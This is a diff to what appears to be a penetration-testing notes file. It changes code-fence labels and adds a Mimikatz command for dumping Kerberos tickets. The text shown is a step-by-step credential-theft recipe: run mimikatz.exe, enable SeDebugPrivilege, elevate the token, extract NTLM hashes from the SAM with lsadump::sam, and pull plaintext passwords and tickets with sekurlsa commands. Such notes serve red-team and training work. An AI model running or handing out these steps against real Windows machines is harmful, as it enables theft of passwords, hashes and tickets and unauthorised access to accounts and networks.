@@ -4,18 +4,22 @@ As an early stage enumeration item, worth running: `Get-LocalUser` to enumerate 
 To start run `.\mimikatz.exe` in a Powershell session. You'll then be dumped in an interactive session in which the commands below can be run.
 
 Enable the `SeDebugPrivilege` access right: 
-```bash
+```cmd
 privilege::debug
 ```
 Elevate privilege (prerequisite for `lsadump::sam`):
-```bash
+```cmd
 token::elevate
 ```
 Extract all NTLM hashes from the SAM:
-```bash
+```cmd
 lsadump::sam
 ```
 Extract plaintext passwords from all available sources:
-```bash
+```cmd
 sekurlsa::logonpasswords
+```
+Get all tickets stored in memory:
+```cmd
+sekurlsa::tickets
 ```
